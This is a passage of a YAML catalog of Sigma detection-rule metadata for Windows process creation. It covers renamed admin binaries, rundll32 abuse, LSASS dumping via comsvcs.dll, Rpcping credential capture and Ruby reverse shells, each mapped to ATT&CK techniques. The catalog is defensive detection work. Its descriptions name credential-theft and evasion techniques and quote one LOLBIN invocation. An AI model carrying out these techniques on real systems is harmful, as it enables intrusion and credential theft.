  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 264982dc-dbad-4dce-b707-1e0d3e0f73d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_nircmd.yml
  name: Renamed NirCmd.EXE Execution
  description: Detects the execution of a renamed "NirCmd.exe" binary based on the
    PE metadata fields.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.t1059
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  - https://www.nirsoft.net/utils/nircmd.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0b0cd537-fc77-4e6e-a973-e53495c1083d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_office_processes.yml
  name: Renamed Office Binary Execution
  description: Detects the execution of a renamed office binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://infosec.exchange/@sbousseaden/109542254124022664
  false_positives:
  - Unknown
  notes: ''
- detection_id: c4e49831-1496-40cf-8ce1-b53f942b02f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_paexec.yml
  name: Renamed PAExec Execution
  description: Detects execution of renamed version of PAExec. Often used by attackers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://www.poweradmin.com/paexec/
  - https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf
  false_positives:
  - Weird admins that rename their tools
  - Software companies that bundle PAExec with their software and rename it, so that
    it is less embarrassing
  - When executed with the "-s" flag. PAExec will copy itself to the "C:\Windows\"
    directory with a different name. Usually like this "PAExec-[XXXXX]-[ComputerName]"
  notes: ''
- detection_id: 2433a154-bb3d-42e4-86c3-a26bdac91c45
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_pingcastle.yml
  name: Renamed PingCastle Binary Execution
  description: Detects the execution of a renamed "PingCastle" binary based on the
    PE metadata fields.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.t1059
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
  - https://www.pingcastle.com/documentation/scanner/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1c12727d-02bf-45ff-a9f3-d49806a3cf43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_plink.yml
  name: Renamed Plink Execution
  description: Detects the execution of a renamed version of the Plink binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/
  - https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 65c3ca2c-525f-4ced-968e-246a713d164f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_pressanykey.yml
  name: Visual Studio NodejsTools PressAnyKey Renamed Execution
  description: Detects renamed execution of "Microsoft.NodejsTools.PressAnyKey.exe",
    which can be abused as a LOLBIN to execute arbitrary binaries
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1463526834918854661
  - https://gist.github.com/nasbench/a989ce64cefa8081bd50cf6ad8c491b5
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2569ed8c-1147-498a-9b8c-2ad3656b10ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_rundll32_dllregisterserver.yml
  name: Potential Renamed Rundll32 Execution
  description: Detects when 'DllRegisterServer' is called in the commandline and the
    image is not rundll32. This could mean that the 'rundll32' utility has been renamed
    in order to avoid detection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20
  - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9ef27c24-4903-4192-881a-3adde7ff92a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_rurat.yml
  name: Renamed Remote Utilities RAT (RURAT) Execution
  description: Detects execution of renamed Remote Utilities (RURAT) via Product PE
    header field
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Discovery
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.collection
  - attack.command-and-control
  - attack.discovery
  - attack.s0592
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f91e51c9-f344-4b32-969b-0b6f6b8537d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_schtasks_execution.yml
  name: Renamed Schtasks Execution
  description: 'Detects the execution of renamed schtasks.exe binary, which is a legitimate
    Windows utility used for scheduling tasks.

    One of the very common persistence techniques is schedule malicious tasks using
    schtasks.exe.

    Since, it is heavily abused, it is also heavily monitored by security products.
    To evade detection, threat actors may rename the schtasks.exe binary to schedule
    their malicious tasks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1036.003
  - T1053.005
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1036.003
  - attack.t1053.005
  time_window: ''
  references:
  - https://x.com/JangPr0/status/1932034543026065833
  - https://ss64.com/nt/schtasks.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: cd764533-2e07-40d6-a718-cfeec7f2da7f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_debugview.yml
  name: Renamed SysInternals DebugView Execution
  description: Detects suspicious renamed SysInternals DebugView execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1588.002
  tags:
  - attack.resource-development
  - attack.t1588.002
  time_window: ''
  references:
  - https://www.epicturla.com/blog/sysinturla
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_procdump.yml
  name: Renamed ProcDump Execution
  description: 'Detects the execution of a renamed ProcDump executable.

    This often done by attackers or malware in order to evade defensive mechanisms.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
  false_positives:
  - Procdump illegally bundled with legitimate software.
  - Administrators who rename binaries (should be investigated).
  notes: ''
- detection_id: 51ae86a2-e2e1-4097-ad85-c46cb6851de4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_psexec_service.yml
  name: Renamed PsExec Service Execution
  description: Detects suspicious launch of a renamed version of the PSEXESVC service
    with, which is not often used by legitimate administrators
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
  - https://www.youtube.com/watch?v=ro2QuZTIMBM
  false_positives:
  - Legitimate administrative tasks
  notes: ''
- detection_id: c1d867fe-8d95-4487-aab4-e53f2d339f90
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_sdelete.yml
  name: Renamed Sysinternals Sdelete Execution
  description: Detects the use of a renamed SysInternals Sdelete, which is something
    an administrator shouldn't do (the renaming)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md
  false_positives:
  - System administrator usage
  notes: ''
- detection_id: 7b4f794b-590a-4ad4-ba18-7964a2832205
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_vmnat.yml
  name: Renamed Vmnat.exe Execution
  description: Detects renamed vmnat.exe or portable version that can be used for
    DLL side-loading
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/malmoeb/status/1525901219247845376
  false_positives:
  - Unknown
  notes: ''
- detection_id: f1086bf7-a0c4-4a37-9102-01e573caf4a0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_whoami.yml
  name: Renamed Whoami Execution
  description: Detects the execution of whoami that has been renamed to a different
    name to avoid detection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  - car.2016-03-001
  time_window: ''
  references:
  - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/
  - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 93671f99-04eb-4ab4-a161-70d446a84003
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml
  name: Capture Credentials with Rpcping.exe
  description: Detects using Rpcping.exe to send a RPC test connection to the target
    server (-s) and force the NTLM hash to be sent in the process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Rpcping/
  - https://twitter.com/vysecurity/status/974806438316072960
  - https://twitter.com/vysecurity/status/873181705024266241
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875578(v=ws.11)
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ruby_inline_command_execution.yml
  name: Ruby Inline Command Execution
  description: Detects execution of ruby using the "-e" flag. This is could be used
    as a way to launch a reverse shell or execute live ruby code.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9248c7e1-2bf3-4661-a22c-600a8040b446
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_ads_stored_dll_execution.yml
  name: Potential Rundll32 Execution With DLL Stored In ADS
  description: Detects execution of rundll32 where the DLL being called is stored
    in an Alternate Data Stream (ADS).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Rundll32
  false_positives:
  - Unknown
  notes: ''
- detection_id: a1473adb-5338-4a20-b4c3-126763e2d3d3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_advpack_obfuscated_ordinal_call.yml
  name: Suspicious Advpack Call Via Rundll32.EXE
  description: Detects execution of "rundll32" calling "advpack.dll" with potential
    obfuscated ordinal calls in order to leverage the "RegisterOCX" function
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/Hexacorn/status/1224848930795552769
  - http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_inline_vbs.yml
  name: Suspicious Rundll32 Invoking Inline VBScript
  description: Detects suspicious process related to rundll32 based on command line
    that invokes inline VBScript as seen being used by UNC2452
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml
  name: Rundll32 InstallScreenSaver Execution
  description: An attacker may execute an application as a SCR File using rundll32.exe
    desk.cpl,InstallScreenSaver
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.t1218.011
  - attack.defense-evasion
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Libraries/Desk/
  - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1218.011/T1218.011.md#atomic-test-13---rundll32-with-deskcpl
  false_positives:
  - Legitimate installation of a new screensaver
  notes: ''
- detection_id: a4694263-59a8-4608-a3a0-6f8d3a51664c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_keymgr.yml
  name: Suspicious Key Manager Access
  description: Detects the invocation of the Stored User Names and Passwords dialogue
    (Key Manager)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1555.004
  tags:
  - attack.credential-access
  - attack.t1555.004
  time_window: ''
  references:
  - https://twitter.com/NinjaParanoid/status/1516442028963659777
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 4782eb5a-a513-4523-a0ac-f3082b26ac5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_mshtml_runhtmlapplication.yml
  name: Mshtml.DLL RunHTMLApplication Suspicious Usage
  description: 'Detects execution of commands that leverage the "mshtml.dll" RunHTMLApplication
    export to run arbitrary code via different protocol handlers (vbscript, javascript,
    file, http...)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/n1nj4sec/status/1421190238081277959
  - https://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_TROJAN.WIN32.POWESSERE.G_MITIGATION_BYPASS_PART2.txt
  - http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1775e15e-b61b-4d14-a1a3-80981298085a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_no_params.yml
  name: Rundll32 Execution Without CommandLine Parameters
  description: Detects suspicious start of rundll32.exe without any parameters as
    found in CobaltStrike beacon activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://www.cobaltstrike.com/help-opsec
  - https://twitter.com/ber_m1ng/status/1397948048135778309
  false_positives:
  - Possible but rare
  notes: ''
- detection_id: bb76d96b-821c-47cf-944b-7ce377864492
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_ntlmrelay.yml
  name: Suspicious NTLM Authentication on the Printer Spooler Service
  description: Detects a privilege elevation attempt by coercing NTLM authentication
    on the Printer Spooler service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1212
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  - attack.t1212
  time_window: ''
  references:
  - https://twitter.com/med0x2e/status/1520402518685200384
  - https://github.com/elastic/detection-rules/blob/dd224fb3f81d0b4bf8593c5f02a029d647ba2b2d/rules/windows/credential_access_relay_ntlm_auth_via_http_spoolss.toml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 43fa5350-db63-4b8f-9a01-789a427074e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_obfuscated_ordinal_call.yml
  name: Potential Obfuscated Ordinal Call Via Rundll32
  description: Detects execution of "rundll32" with potential obfuscated ordinal calls
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.010
  tags:
  - attack.defense-evasion
  - attack.t1027.010
  time_window: ''
  references:
  - Internal Research
  - https://www.youtube.com/watch?v=52tAmVLg1KM&t=2070s
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1723e720-616d-4ddc-ab02-f7e3685a4713
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_parent_explorer.yml
  name: Rundll32 Spawned Via Explorer.EXE
  description: Detects execution of "rundll32.exe" with a parent process of Explorer.exe.
    This has been observed by variants of Raspberry Robin, as first reported by Red
    Canary.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/raspberry-robin/
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 646ea171-dded-4578-8a4d-65e9822892e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml
  name: Process Memory Dump Via Comsvcs.DLL
  description: Detects a process memory dump via "comsvcs.dll" using rundll32, covering
    multiple different techniques (ordinal, minidump function, etc.)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1036
  - attack.t1003.001
  - car.2013-05-009
  time_window: ''
  references:
  - https://twitter.com/shantanukhande/status/1229348874298388484
  - https://twitter.com/pythonresponder/status/1385064506049630211?s=21
  - https://twitter.com/Hexacorn/status/1224848930795552769
  - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
  - https://twitter.com/SBousseaden/status/1167417096374050817
  - https://twitter.com/Wietze/status/1542107456507203586
  - https://github.com/Hackndo/lsassy/blob/14d8f8ae596ecf22b449bfe919829173b8a07635/lsassy/dumpmethod/comsvcs.py
  - https://www.youtube.com/watch?v=52tAmVLg1KM&t=2070s
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f1edd233-30b5-4823-9e6a-c4171b24d316
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_registered_com_objects.yml
  name: Rundll32 Registered COM Objects
  description: load malicious registered COM objects
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.015
  time_window: ''
  references:
  - https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 15b75071-74cc-47e0-b4c6-b43744a62a2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_run_locations.yml
  name: Suspicious Process Start Locations
  description: Detects suspicious process run from unusual locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - car.2013-05-002
  time_window: ''
  references:
  - https://car.mitre.org/wiki/CAR-2013-05-002
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: 285b85b1-a555-4095-8652-a8a4106af63f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_setupapi_installhinfsection.yml
  name: Suspicious Rundll32 Setupapi.dll Activity
  description: setupapi.dll library provide InstallHinfSection function for processing
    INF files. INF file may contain instructions allowing to create values in the
    registry, modify files and install drivers. This technique could be used to obtain
    persistence via modifying one of Run or RunOnce registry keys, run process or
    use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll
    calls runonce.exe executable regardless of actual content of INF file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Libraries/Setupapi/
  - https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf
  - https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf
  - https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20
  false_positives:
  - Scripts and administrative tools that use INF files for driver installation with
    setupapi.dll
  notes: ''
- detection_id: 32b96012-7892-429e-b26c-ac2bf46066ff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_shell32_susp_execution.yml
  name: Shell32 DLL Execution in Suspicious Directory
  description: Detects shell32.dll executing a DLL in a suspicious directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.011
  time_window: ''
  references:
  - https://www.group-ib.com/resources/threat-research/red-curl-2.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 82343930-652f-43f5-ab70-2ee9fdd6d5e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rundll32_shelldispatch_potential_abuse.yml
  name: Potential ShellDispatch.DLL Functionality Abuse
  description: Detects potential "ShellDispatch.dll" functionality abuse to execute
    arbitrary binaries via "ShellExecute"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
